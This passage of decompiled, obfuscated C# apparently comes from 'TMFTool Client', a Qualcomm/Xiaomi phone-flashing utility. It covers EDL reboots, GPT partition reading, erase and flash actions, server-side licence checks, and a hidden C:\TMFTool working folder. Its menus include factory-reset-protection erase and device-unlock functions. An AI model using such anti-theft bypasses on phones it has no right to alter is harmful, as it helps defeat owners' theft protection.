			((Control)this.m_109).Text = "NoLoad";
			((Control)this.m_12c).Text = "K.Data";
			((Control)this.m_142).Text = "C.Read";
			((Control)this.m_12d).Text = "KeepNV";
			((Control)this.m_91).Text = "Find partition";
			((Control)this.m_cd).Text = "Spd";
			((Control)this.m_e7).Text = "Stop";
			((Control)this.m_ec).Text = "File";
			((Control)this.m_cc).Text = "Auto-Detect";
			((ToolStripItem)this.m_ab).Text = "Quick actions";
			((ToolStripItem)this.m_ac).Text = "Reboot System";
			((ToolStripItem)this.m_ad).Text = "Reboot Bootloader";
			((ToolStripItem)this.m_ae).Text = "Reboot FastbootD";
			((ToolStripItem)this.m_af).Text = "Reboot Recovery";
			((ToolStripItem)this.m_b0).Text = "MI To EDL";
			((ToolStripItem)this.m_e3).Text = "LV TO EDL";
			((ToolStripItem)this.m_123).Text = "Slots Set";
			((ToolStripItem)this.m_150).Text = "Reboot Xiaomi Assistant";
			((ToolStripItem)this.m_141).Text = "MI UNlock Devices";
			((ToolStripItem)this.m_b1).Text = "EDL";
			((ToolStripItem)this.m_b2).Text = "EDL to System";
			((ToolStripItem)this.m_b6).Text = "EDL to EDL";
			((ToolStripItem)this.m_b7).Text = "EDL to Recovery";
			((ToolStripItem)this.m_b8).Text = "EDL to FastbootD";
			((ToolStripItem)this.m_b9).Text = "EDL Factory reset";
			((ToolStripItem)this.m_12e).Text = "Flyme Factory reset";
			((ToolStripItem)this.m_ba).Text = "MI ACC ID";
			((ToolStripItem)this.m_bc).Text = "Back modem";
			((ToolStripItem)this.m_bd).Text = "ERase modem";
			((ToolStripItem)this.m_13c).Text = "Erase all";
			((ToolStripItem)this.m_13d).Text = "repair GPT";
			((ToolStripItem)_13e).Text = "Back GPT";
			((ToolStripItem)this.m_b3).Text = "Tool";
			((ToolStripItem)this.m_b4).Text = "Device Manager";
			((ToolStripItem)this.m_be).Text = "CMD";
			((Control)this.m_128).Text = "Qualcomm";
			((Control)this.m_e5).Text = "Info";
			((Control)this.m_e9).Text = "Port";
			((Control)this.m_90).Text = "Partitioned tables";
			((Control)this.m_8f).Text = "Log";
			((Control)this.m_ee).Text = "Read Info";
			((Control)this.m_ef).Text = "Twrp FlashZip";
			((Control)this.m_fa).Text = "Mi-Rec update";
			((Control)this.m_ea).Text = "Browse";
			((Control)this.m_10d).Text = "TWRP Action area";
			((Control)this.m_f3).Text = "ReadGPT";
			((Control)this.m_f4).Text = "Read";
			((Control)f1).Text = "Erase";
			((Control)this.m_f2).Text = "Flash";
			((Control)this.m_105).Text = "Xiaomi Assistant factory reset";
			((Control)this.m_d7).Text = "Partitioned tables";
			((Control)this.m_10c).Text = "Rec Action";
			((ToolStripItem)this.m_14e).Text = "MD5 checksum";
			((ToolStripItem)this.m_14f).Text = "Generate a validation file";
			((Control)this.m_10f).Text = "Partitioned tables";
			((Control)this.m_117).Text = "Read GPT";
			((Control)this.m_118).Text = "Erase";
			((Control)this.m_119).Text = "Flash";
			((Control)this.m_11d).Text = "choose";
			((Control)this.m_11b).Text = "Rest";
			((Control)_11e).Text = "A slot";
			((Control)this.m_120).Text = "S.Data";
			((Control)this.m_121).Text = "S.CRC";
			((Control)this.m_122).Text = "S.DM";
			((Control)this.m_11f).Text = "Lock";
			((Control)this.m_131).Text = "Solve paylod";
			((Control)this.m_132).Text = "Flash";
			((Control)this.m_130).Text = "Erase Data";
			((Control)this.m_139).Text = "Reboot";
			((Control)this.m_13b).Text = "Erase Frp";
			((Control)this.m_13a).Text = "A slot";
			((Control)this.m_175).Text = "Fix FBD";
			((Control)this.m_dd).Text = "Drives";
			((Control)this.m_ce).Text = "Qualcomm driver";
			((Control)this.m_db).Text = "Android driver";
			((Control)this.m_df).Text = "stickup";
			((Control)this.m_e2).Text = "extract";
			((Control)this.m_100).Text = "Make a boot";
			((Control)this.m_f5).Text = "Modify persist";
			((Control)this.m_f6).Text = "Modify modem";
			((ToolStripItem)this.m_153).Text = "MIErase Frp";
			((Control)this.m_156).Text = "Make Cust";
			((Control)this.m_c8).Text = "Please use your account carefully to ensure the security of your information！\r\nWarning: Renting an account and misusing it will result in a ban!\r\n";
			((Control)_160).Text = "Meta Super Make";
			((Control)this.m_15f).Text = "OFP Super Make";
		}
		else
		{
			((Control)this.m_c8).Text = "请谨慎使用账户，确保信息安全！\r\n警告：租借账户与不当用行为将导致封号！\r\n 注意：所有刷机记录均可回溯！\r\n";
		}
	}

	private void _79()
	{
		((DataGridView)this.m_143).ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
		((DataGridView)this.m_143).CellBorderStyle = DataGridViewCellBorderStyle.None;
		((DataGridView)this.m_143).DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		((DataGridView)this.m_143).ColumnHeadersDefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		((DataGridView)this.m_143).AllowUserToResizeRows = false;
		((DataGridView)this.m_143).DefaultCellStyle.SelectionBackColor = ((DataGridView)this.m_143).DefaultCellStyle.BackColor;
		((DataGridView)this.m_143).DefaultCellStyle.SelectionForeColor = ((DataGridView)this.m_143).DefaultCellStyle.ForeColor;
		foreach (DataGridViewColumn column in ((DataGridView)this.m_143).Columns)
		{
			column.SortMode = DataGridViewColumnSortMode.NotSortable;
		}
		((DataGridView)this.m_143).SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		((DataGridView)this.m_143).MultiSelect = false;
		((DataGridView)this.m_143).DefaultCellStyle.SelectionBackColor = Color.LightSkyBlue;
		((DataGridView)this.m_143).DefaultCellStyle.SelectionForeColor = Color.White;
	}

	private void _7a()
	{
		((DataGridView)this.m_16e).ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
		((DataGridView)this.m_16e).CellBorderStyle = DataGridViewCellBorderStyle.None;
		((DataGridView)this.m_16e).DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		((DataGridView)this.m_16e).ColumnHeadersDefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		((DataGridView)this.m_16e).AllowUserToResizeRows = false;
		((DataGridView)this.m_16e).DefaultCellStyle.SelectionBackColor = ((DataGridView)this.m_16e).DefaultCellStyle.BackColor;
		((DataGridView)this.m_16e).DefaultCellStyle.SelectionForeColor = ((DataGridView)this.m_16e).DefaultCellStyle.ForeColor;
		foreach (DataGridViewColumn column in ((DataGridView)this.m_16e).Columns)
		{
			column.SortMode = DataGridViewColumnSortMode.NotSortable;
		}
		((DataGridView)this.m_16e).SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		((DataGridView)this.m_16e).MultiSelect = false;
		((DataGridView)this.m_16e).DefaultCellStyle.SelectionBackColor = Color.LightSkyBlue;
		((DataGridView)this.m_16e).DefaultCellStyle.SelectionForeColor = Color.White;
	}

	private async void _7b(object sender, object e)
	{
		_78();
		Config.Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		Message.success((Form)(object)this, "登录成功 到期时间: " + (string)this.m_26, (Font)null, (int?)null);
		((ListView)this.m_d0).HideSelection = true;
		((Control)this.m_cf).Text = "";
		((TextBoxBase)this.m_c8).ReadOnly = true;
		((Control)this.m_12a).Visible = false;
		((Control)this.m_12f).Visible = false;
		adb();
		string targetDirectory = "C:\\TMFTool";
		if (!Directory.Exists(targetDirectory))
		{
			Directory.CreateDirectory(targetDirectory);
		}
		File.SetAttributes(targetDirectory, FileAttributes.Hidden | FileAttributes.System);
		_7c();
		await (Task)_7f();
		await _76();
		((Control)this.m_92).Text = (string)_24;
		_6();
		_8();
		await officLoader((string)_24, (string)this.m_27);
		if (_2c != (IntPtr)0)
		{
			await Loader((string)_24, (string)this.m_27);
		}
		((UIComboBox)this.m_10a).SelectedIndex = 0;
		object obj = _77();
		if (lang == "en")
		{
			((Control)this.m_b5).Text = "Win: " + (string)obj;
		}
		else
		{
			((Control)this.m_b5).Text = "系统: " + (string)obj;
		}
		((Control)this.m_124).Text = "";
		((Control)this.m_107).Text = "";
		((Control)this.m_10e).Text = "";
		((UIRadioButton)this.m_da).Checked = true;
		((UICheckBox)this.m_c7).Checked = true;
		((Checkbox)this.m_12d).Checked = true;
		((RichTextBox)this.m_c8).ScrollBars = RichTextBoxScrollBars.Vertical;
		((TextBoxBase)this.m_c8).ReadOnly = true;
		((ComboBox)this.m_91).AutoCompleteMode = AutoCompleteMode.SuggestAppend;
		((ComboBox)this.m_91).AutoCompleteSource = AutoCompleteSource.CustomSource;
		Config.Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((UICheckBox)this.m_cc).Checked = true;
		((Select)this.m_134).SelectedIndex = 0;
	}

	private void _7c()
	{
		string sourceArchiveFileName = Path.Combine("C:\\TMFTool", "adb.zip");
		using (FileStream fileStream = new FileStream(sourceArchiveFileName, FileMode.Create, FileAccess.Write))
		{
			byte[] tools = Resources.tools;
			fileStream.Write(tools, 0, tools.Length);
		}
		try
		{
			ZipFile.ExtractToDirectory(sourceArchiveFileName, "C:\\TMFTool");
			File.Delete(sourceArchiveFileName);
		}
		catch (Exception ex)
		{
			MessageBox.Show("解压或删除操作失败: " + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			Application.Exit();
		}
	}

	public async Task Loader(string user, string password)
	{
		try
		{
			long num = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
			object obj = $"username={user}&password={password}&timestamp={num}";
			object mD5Hash = AesHelper.GetMD5Hash((string)obj + SigKey);
			object obj2 = new
			{
				username = user,
				password = password,
				Timestamp = num,
				Token = (string)this.m_29,
				Sign = (string)mD5Hash
			};
			object plainText = JsonConvert.SerializeObject(obj2);
			object stringToEscape = AesHelper.Encrypt((string)plainText);
			object obj3 = Uri.EscapeDataString((string)stringToEscape);
			object obj4 = await HttpHelper.Get(Url: "/api/V1/UserList?encryptedRequest=" + (string)obj3, api: (string)this.m_25);
			nint num2 = ((JToken)obj4).Value<int>((object)"code");
			object text = ((JToken)obj4).Value<string>((object)"message");
			JToken val = ((JObject)obj4)["data"];
			object obj5 = ((val is JArray) ? val : null);
			if (num2 != 200)
			{
				MessageBox.Show((string)text, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				if (num2 != 200 || obj5 == null)
				{
					return;
				}
				object obj6 = new List<object>();
				object obj7 = new List<object>();
				object enumerator = ((JArray)obj5).GetEnumerator();
				try
				{
					while (((IEnumerator)enumerator).MoveNext())
					{
						object current = ((IEnumerator<JToken>)enumerator).Current;
						object obj8 = ((object)((JToken)current)[(object)"name"])?.ToString();
						object obj9 = ((object)((JToken)current)[(object)"status"])?.ToString();
						object user2 = ((object)((JToken)current)[(object)"user"])?.ToString();
						object id = ((object)((JToken)current)[(object)"id"])?.ToString();
						if (!string.IsNullOrEmpty((string)obj8))
						{
							if ((string)obj9 == "1")
							{
								((List<object>)obj7).Add((object)new
								{
									Name = (string)obj8,
									User = (string)user2,
									Id = (string)id,
									Status = (string)obj9
								});
							}
							else
							{
								((List<object>)obj6).Add((object)new
								{
									Name = (string)obj8,
									User = (string)user2,
									Id = (string)id,
									Status = (string)obj9
								});
							}
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (_2c == (IntPtr)1 || _2c == (IntPtr)2 || _2c == (IntPtr)4)
				{
					foreach (dynamic item in (List<object>)obj6)
					{
						((UIComboBox)this.m_10a).Items.Add($"云端私有;{(object)item.Name} 文件ID:{(object)item.Id}");
					}
				}
				if (_2c != (IntPtr)2)
				{
					return;
				}
				object obj10 = ((IEnumerable<object>)obj7).OrderBy((dynamic f) => f.User).ToList();
				foreach (dynamic item2 in (List<object>)obj10)
				{
					((UIComboBox)this.m_10a).Items.Add($"分享人;{(object)item2.User} 云端公开;{(object)item2.Name} 文件ID:{(object)item2.Id}");
				}
			}
		}
		catch (Exception ex)
		{
			object obj11 = ex;
			MessageBox.Show("请求失败: " + ((Exception)obj11).Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	public async Task officLoader(string user, string password)
	{
		long num = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
		object obj = $"username={user}&password={password}&timestamp={num}";
		object mD5Hash = AesHelper.GetMD5Hash((string)obj + SigKey);
		object obj2 = new
		{
			username = user,
			password = password,
			Timestamp = num,
			Token = (string)this.m_29,
			Sign = (string)mD5Hash
		};
		object plainText = JsonConvert.SerializeObject(obj2);
		object stringToEscape = AesHelper.Encrypt((string)plainText);
		object obj3 = Uri.EscapeDataString((string)stringToEscape);
		object obj4 = await HttpHelper.Get(Url: "/api/V1/Bootlists?encryptedRequest=" + (string)obj3, api: (string)this.m_25);
		nint num2 = ((JToken)obj4).Value<int>((object)"code");
		object text = ((JToken)obj4).Value<string>((object)"message");
		JToken val = ((JObject)obj4)["data"];
		object obj5 = ((val is JArray) ? val : null);
		if (num2 != 200)
		{
			MessageBox.Show((string)text, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
		else
		{
			if (num2 != 200 || obj5 == null)
			{
				return;
			}
			object CS_0024_003C_003E8__locals4 = new _003C_003Ec__DisplayClass223_0();
			((List<FileItem>)_19).Clear();
			((UIComboBox)this.m_10a).Items.Clear();
			((_003C_003Ec__DisplayClass223_0)CS_0024_003C_003E8__locals4).specialItem = ((IEnumerable<JToken>)obj5).FirstOrDefault((JToken d) => ((object)d[(object)"name"])?.ToString().Contains("高通骁龙芯片") ?? false);
			if (((_003C_003Ec__DisplayClass223_0)CS_0024_003C_003E8__locals4).specialItem != null)
			{
				object obj6 = ((object)((_003C_003Ec__DisplayClass223_0)CS_0024_003C_003E8__locals4).specialItem[(object)"name"])?.ToString();
				((List<FileItem>)_19).Add(new FileItem
				{
					Name = (string)obj6
				});
				((UIComboBox)this.m_10a).Items.Add("官方:" + (string)obj6);
			}
			if (_2c == (IntPtr)4)
			{
				return;
			}
			object obj7 = ((IEnumerable<JToken>)obj5).Where((JToken d) => d != ((_003C_003Ec__DisplayClass223_0)CS_0024_003C_003E8__locals4).specialItem).OrderBy((JToken d) =>
			{
				string text2 = ((object)d[(object)"name"])?.ToString() ?? "";
				if (text2.Contains("小米") && !text2.Contains("红米") && !text2.Contains("黑鲨"))
				{
					return 1;
				}
				if (text2.Contains("OPPO"))
				{
					return 2;
				}
				if (text2.Contains("联想"))
				{
					return 3;
				}
				return (text2.Contains("红米") || text2.Contains("黑鲨")) ? 4 : int.MaxValue;
			}).ThenBy((JToken d) =>
			{
				string input = ((object)d[(object)"name"])?.ToString() ?? "";
				Match match = Regex.Match(input, "(\\d+)");
				return match.Success ? int.Parse(match.Groups[1].Value) : int.MaxValue;
			})
				.ToList();
			foreach (JToken item in (List<JToken>)obj7)
			{
				object obj8 = ((object)item[(object)"name"])?.ToString();
				if (!string.IsNullOrEmpty((string)obj8))
				{
					((List<FileItem>)_19).Add(new FileItem
					{
						Name = (string)obj8
					});
					((UIComboBox)this.m_10a).Items.Add("官方:" + (string)obj8);
				}
			}
		}
	}

	private object _7f()
	{
		if (!string.IsNullOrEmpty((string)this.m_28))
		{
			((Control)_13f).Text = (string)this.m_28;
		}
		else
		{
			((Control)_13f).Text = "TMFTool Client";
		}
		return Task.CompletedTask;
	}

	private void _80(object sender, object e)
	{
		if (_18 != null)
		{
			((System.Timers.Timer)_18).Stop();
			((Component)_18).Dispose();
		}
		if (_1b != null)
		{
			((Component)_1b).Dispose();
		}
		string[] array = new string[2] { "adb", "mi_adb" };
		string[] array2 = array;
		foreach (string processName in array2)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			Process[] array3 = processesByName;
			foreach (Process process in array3)
			{
				try
				{
					process.Kill();
					process.WaitForExit();
				}
				catch
				{
				}
			}
		}
		string text = "C:\\TMFTool";
		string text2 = "C:\\TMFTool_Log";
		try
		{
			if (Directory.Exists(text))
			{
				Directory.Delete(text, recursive: true);
			}
			if (Directory.Exists(text2))
			{
				Directory.Delete(text2, recursive: true);
			}
		}
		catch
		{
		}
		Application.Exit();
	}

	public void adb()
	{
		if (_18 != null)
		{
			((System.Timers.Timer)_18).Stop();
			((Component)_18).Dispose();
		}
		if (_1b != null)
		{
			((Component)_1b).Dispose();
		}
		string[] array = new string[3] { "adb", "fastboot", "mi_adb" };
		string[] array2 = array;
		foreach (string processName in array2)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			Process[] array3 = processesByName;
			foreach (Process process in array3)
			{
				try
				{
					process.Kill();
					process.WaitForExit();
				}
				catch
				{
				}
			}
		}
		string text = "C:\\TMFTool";
		string text2 = "C:\\TMFTool_Log";
		try
		{
			if (Directory.Exists(text))
			{
				Directory.Delete(text, recursive: true);
			}
			if (Directory.Exists(text2))
			{
				Directory.Delete(text2, recursive: true);
			}
		}
		catch
		{
		}
	}

	private async void _82(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		((Control)this.m_107).Text = "";
		this.m_47 = OpreationMain.ReadFlash;
		_48 = READPartition.ErasePart;
		this.m_11 = (Button)sender;
		this.m_12 = null;
		DialogResult dialogResult = MessageBox.Show("您确定要擦除分区吗？", "确认操作", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
		if (dialogResult == DialogResult.Yes)
		{
			falseButtons();
			if (!((Checkbox)this.m_109).Checked)
			{
				Shahala();
				return;
			}
			nint num2 = 0;
			object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
					if (!((DataGridViewRow)obj).IsNewRow)
					{
						nint result = 0;
						if (((DataGridViewRow)obj).Cells["Check"].Value != null)
						{
							NativeValues.TryParseBoolean(((DataGridViewRow)obj).Cells["Check"].Value.ToString(), out result);
						}
						if ((int)result != 0)
						{
							num2 = 1;
							break;
						}
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			if (num2 == 0)
			{
				Msg("请勾选分区进行操作\n");
				EnableButtons();
			}
			else
			{
				await _47();
			}
		}
		else
		{
			Msg("取消擦除分区\n");
		}
	}

	private void _83(object sender, object e)
	{
		try
		{
			Process.Start("devmgmt.msc");
		}
		catch (Exception ex)
		{
			MessageBox.Show("无法打开设备管理器：" + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void _84(object sender, object e)
	{
		bool flag = ((CheckBox)this.m_8e).Checked;
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_143).Rows)
		{
			if (item.Cells["Check"] is DataGridViewCheckBoxCell dataGridViewCheckBoxCell)
			{
				dataGridViewCheckBoxCell.Value = flag;
			}
		}
	}

	private void _85(object sender, object e)
	{
		if ((int)(nint)_55 != 0)
		{
			return;
		}
		string text = ((Control)this.m_91).Text.Trim();
		if (string.IsNullOrEmpty(text))
		{
			((ComboBox)this.m_91).DroppedDown = false;
			return;
		}
		_55 = (IntPtr)1;
		int selectionStart = ((ComboBox)this.m_91).SelectionStart;
		List<string> list = new List<string>();
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_143).Rows)
		{
			if (!item.IsNewRow)
			{
				string text2 = item.Cells["name"].Value?.ToString();
				if (!string.IsNullOrEmpty(text2) && text2.StartsWith(text, StringComparison.OrdinalIgnoreCase))
				{
					list.Add(text2);
				}
			}
		}
		if (list.Count == 0)
		{
			((ComboBox)this.m_91).DroppedDown = false;
			_55 = (IntPtr)0;
			return;
		}
		((ComboBox)this.m_91).DroppedDown = false;
		((ComboBox)this.m_91).Items.Clear();
		ComboBox.ObjectCollection items = ((ComboBox)this.m_91).Items;
		object[] items2 = list.ToArray();
		items.AddRange(items2);
		((Control)this.m_91).Text = text;
		((ComboBox)this.m_91).SelectionStart = selectionStart;
		((ComboBox)this.m_91).SelectionLength = 0;
		((Control)this.m_91).Cursor = Cursors.Default;
		_55 = (IntPtr)0;
	}

	private void _86(object sender, object e)
	{
		if (((ListControl)this.m_91).SelectedIndex < 0)
		{
			return;
		}
		string text = ((ComboBox)this.m_91).SelectedItem?.ToString();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_143).Rows)
		{
			if (!item.IsNewRow)
			{
				string text2 = item.Cells["name"].Value?.ToString();
				if (text2 == text)
				{
					((DataGridView)this.m_143).ClearSelection();
					item.Selected = true;
					((DataGridView)this.m_143).FirstDisplayedScrollingRowIndex = item.Index;
					break;
				}
			}
		}
	}

	private void _87(object sender, EventArgs e)
	{
	}

	public async Task<bool> ValidateAccountAsync(string username)
	{
		if (lang == "en")
		{
			Msg("\nVerify active...");
		}
		else
		{
			Msg("\n验证账户...");
		}
		if (string.IsNullOrWhiteSpace(username))
		{
			msgred();
			Msg("未登录\n");
			return false;
		}
		falseButtons();
		long num = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
		object obj = $"username={username}&password={this.m_27}&timestamp={num}";
		object mD5Hash = AesHelper.GetMD5Hash((string)obj + SigKey);
		object obj2 = new
		{
			username = username,
			password = (string)this.m_27,
			Timestamp = num,
			Token = (string)this.m_29,
			Hwid = (string)_2a,
			Sign = (string)mD5Hash
		};
		object plainText = JsonConvert.SerializeObject(obj2);
		object stringToEscape = AesHelper.Encrypt((string)plainText);
		object obj3 = Uri.EscapeDataString((string)stringToEscape);
		object obj4 = await HttpHelper.Get(Url: "/api/V1/GiveUser?encryptedRequest=" + (string)obj3, api: (string)this.m_25);
		nint num2 = ((JToken)obj4).Value<int>((object)"code");
		object obj5 = ((JToken)obj4).Value<string>((object)"message");
		if (num2 != 200)
		{
			msgred();
			Msg((string)obj5 + "\n");
			EnableButtons();
			return false;
		}
		fa();
		Msg("OK\n");
		EnableButtons();
		return true;
	}

	private void _89()
	{
		((Stopwatch)this.m_56).Reset();
		((Stopwatch)this.m_56).Start();
	}

	private void _8a()
	{
		((Stopwatch)this.m_56).Stop();
	}

	private void _8b()
	{
		TimeSpan elapsed = ((Stopwatch)this.m_56).Elapsed;
		string text = "";
		if (elapsed.TotalMilliseconds < 1000.0)
		{
			text = $"{elapsed.TotalMilliseconds:0}ms";
		}
		else if (elapsed.TotalSeconds < 60.0)
		{
			text = $"{elapsed.TotalSeconds:0.###}s ({elapsed.TotalMilliseconds:0}ms)";
		}
		else
		{
			text = ((!(elapsed.TotalMinutes < 60.0)) ? $"{(int)elapsed.TotalHours}h {elapsed.Minutes}m {elapsed.Seconds}s ({elapsed.TotalMilliseconds:0}ms)" : $"{(int)elapsed.TotalMinutes}m {elapsed.Seconds}s ({elapsed.TotalMilliseconds:0}ms)");
		}
		if (lang == "zh")
		{
			Msg("\n耗时: " + text + "\n");
		}
		else
		{
			Msg("\ntimer: " + text + "\n");
		}
	}

	private async void _8c(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		((List<string>)this.m_73).Clear();
		((Control)this.m_107).Text = "";
		falseButtons();
		this.m_11 = (Button)sender;
		this.m_12 = null;
		if (((Checkbox)this.m_109).Checked)
		{
			_ = ((Control)this.m_126).Text;
			object value = ((Control)this.m_126).Text.Trim();
			if (string.IsNullOrEmpty((string)value))
			{
				Msg("等待端口...100 秒");
				nint num2 = ((await _92(100u)) ? 1 : 0);
				IntPtr intPtr2 = num2;
				if (intPtr2 != (IntPtr)0)
				{
					_3d(1u);
					if (this.m_11 != null && this.m_11 != this.m_c9)
					{
						((Button)this.m_11).PerformClick();
						this.m_11 = null;
					}
				}
				return;
			}
			nint num3 = ((await _26()) ? 1 : 0);
			if ((int)num3 == 0)
			{
				return;
			}
			((TextBoxBase)this.m_ca).Clear();
			((TextBoxBase)this.m_bb).Clear();
			_17 = null;
			((UITextBox)this.m_c5).Clear();
			((UITextBox)this.m_c4).Clear();
			this.m_54 = null;
			WriteData.patchXMLList = Array.Empty<string>();
			falseButtons();
			object path = "C:\\TMFTool";
			Directory.CreateDirectory((string)path);
			this.m_47 = OpreationMain.ReadFlash;
			_48 = READPartition.ReadPart;
			object start = "0";
			object obj = "4096";
			object numsector = "6";
			if (!((UIRadioButton)this.m_da).Checked)
			{
				obj = "512";
				numsector = "34";
			}
			((DataGridView)this.m_143).Rows.Clear();
			PortQcom = ((Control)this.m_126).Text;
			this.m_59 = (IntPtr)0;
			await Task.Delay(200);
			OpenDisk(PortQcom);
			this.m_5a = (IntPtr)0;
			_89();
			Msg("读取GPT...");
			nint num4 = 0;
			while (num4 < 10)
			{
				((List<RawPartition>)this.m_3e).Clear();
				object name = $"gpt_main{(int)num4}";
				object path2 = $"gpt_main{(int)num4}.img";
				object physicalNum = ((int)num4).ToString();
				((List<RawPartition>)this.m_3e).Add(new RawPartition((string)name, "", "", (string)start, (string)obj, (string)numsector, (string)physicalNum, download: true));
				int num7;
				try
				{
					await Task.Delay(10);
					nint num5 = ((await Task.Run(() => c8())) ? 1 : 0);
					IntPtr intPtr3 = num5;
					if ((int)(nint)intPtr3 == 0)
					{
						msgred();
						Msg("Error\n");
						((Control)this.m_cf).Text = "ReadGPT Error";
						EnableButtons();
						_8a();
						DiskClose();
						return;
					}
					object fileName = Path.Combine((string)path, (string)path2);
					ulong length = (ulong)new FileInfo((string)fileName).Length;
					if (length == 0)
					{
						fa();
						Msg("OK\n");
						((Control)this.m_cf).Text = "ReadGPT Succeed";
						break;
					}
					this.m_5a += (nint)1;
					object obj2 = new MemoryStream();
					try
					{
						object obj3 = new FileStream((string)fileName, FileMode.Open, FileAccess.Read);
						try
						{
							object obj4 = new byte[51200];
							while (true)
							{
								nint num6 = (num7 = ((Stream)obj3).Read((byte[])obj4, 0, ((Array)obj4).Length));
								if (num7 > 0)
								{
									((Stream)obj2).Write((byte[])obj4, 0, (int)num6);
									continue;
								}
								break;
							}
						}
						finally
						{
							((IDisposable)obj3)?.Dispose();
						}
						this.m_57 = "";
						this.m_57 = BitConverter.ToString(((MemoryStream)obj2).ToArray(), 0).Replace("-", string.Empty).ToLower();
						_91();
						if (_8e(this.m_58) == 0 || _8f(this.m_58 * 2) == 0)
						{
							this.m_5a -= (nint)1;
							goto end_IL_0750;
						}
						_8d((uint)num4, obj);
						goto end_IL_05be;
						end_IL_0750:;
					}
					finally
					{
						((IDisposable)obj2)?.Dispose();
					}
					end_IL_05be:;
				}
				catch (Exception ex)
				{
					msgred();
					Msg("Error\n");
					EnableButtons();
					MessageBox.Show("发生了一个错误: " + ex.Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					DiskClose();
					_8a();
					return;
				}
				num7 = (int)num4;
				num4 = num7 + 1;
			}
			DiskClose();
			Msg("\n扇区数: " + Unsafe.As<IntPtr, int>(ref this.m_5a) + "\n");
			Msg("分区数: " + Unsafe.As<IntPtr, int>(ref this.m_59) + "\n");
			((UIProcessBar)this.m_c1).Value = ((UIProcessBar)this.m_c1).Maximum;
			EnableButtons();
			_8a();
			_8b();
			nint num8 = 0;
			while (num8 < (nint)this.m_5a + 1)
			{
				object path2 = $"gpt_main{(int)num8}.img";
				object obj5 = Path.Combine((string)path, (string)path2);
				File.Delete((string)obj5);
				int num7 = (int)num8;
				num8 = num7 + 1;
			}
		}
		else
		{
			falseButtons();
			Shahala();
		}
	}

	private unsafe uint _8d(uint Lun, object sectorSizeStr)
	{
		for (int i = 1; i <= (nint)_5b; i++)
		{
			if (!((string)((object[])_5d)[i]).Contains("last_parti"))
			{
				int index = ((DataGridView)this.m_143).Rows.Add();
				DataGridViewRow dataGridViewRow = ((DataGridView)this.m_143).Rows[index];
				dataGridViewRow.Cells["Check"].Value = false;
				dataGridViewRow.Cells["L"].Value = ((int)Lun).ToString();
				dataGridViewRow.Cells["name"].Value = ((object[])_5d)[i];
				dataGridViewRow.Cells["filename"].Value = "空文件";
				dataGridViewRow.Cells["star"].Value = ((ulong[])this.m_5f)[i].ToString();
				dataGridViewRow.Cells["num"].Value = ((ulong[])this.m_66)[i].ToString();
				string value = "0x0";
				if (long.TryParse(((ulong[])this.m_5f)[i].ToString(), out var result) && long.TryParse((string)sectorSizeStr, out var result2))
				{
					value = "0x" + (result * result2).ToString("X");
				}
				long bytes = (long)Math.Round(Conversions.ToDouble(((ulong[])this.m_66)[i].ToString()) * Conversions.ToDouble((string)sectorSizeStr));
				dataGridViewRow.Cells["Size"].Value = _60(bytes);
				dataGridViewRow.Cells["Hex"].Value = value;
				if (lang == "zh")
				{
					dataGridViewRow.Cells["filePath"].Value = "双击选择文件";
				}
				else
				{
					dataGridViewRow.Cells["filePath"].Value = "Double click to select a file";
				}
			}
		}
		((DataGridView)this.m_143).ClearSelection();
		this.m_59 += (nint)_5b;
		return 1u;
	}

	private uint _8e(ulong startoffset_byte)
	{
		ulong num = startoffset_byte * 2;
		if (((string)this.m_57).Substring((int)num, 16) == "4546492050415254")
		{
			return 1u;
		}
		return 0u;
	}

	private uint _8f(ulong startoffset_byte)
	{
		ulong num = startoffset_byte * 2;
		string text = "";
		_5b = (IntPtr)0;
		while (((string)this.m_57).Substring((int)((int)num + 64 + 256 * (nint)_5b), 32) != "00000000000000000000000000000000")
		{
			_5b += (nint)1;
		}
		if (_5b == (IntPtr)0)
		{
			return 1u;
		}
		text = ((string)this.m_57).Substring((int)num, (int)((nint)_5b * 256));
		for (int i = 1; i <= (nint)_5b; i++)
		{
